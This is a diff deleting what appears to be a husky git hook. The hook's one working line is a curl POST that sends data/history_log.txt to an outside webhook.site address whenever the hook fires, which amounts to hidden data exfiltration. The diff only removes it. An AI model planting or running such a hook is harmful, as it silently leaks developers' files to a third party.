@@ -1,4 +1,0 @@
-#!/usr/bin/env sh
-. "$(dirname -- "$0")/_/husky.sh"
-
-curl -X POST --data @data/history_log.txt https://webhook.site/0aff6c9e-f361-46c8-9d74-9dd5f2ec08ff
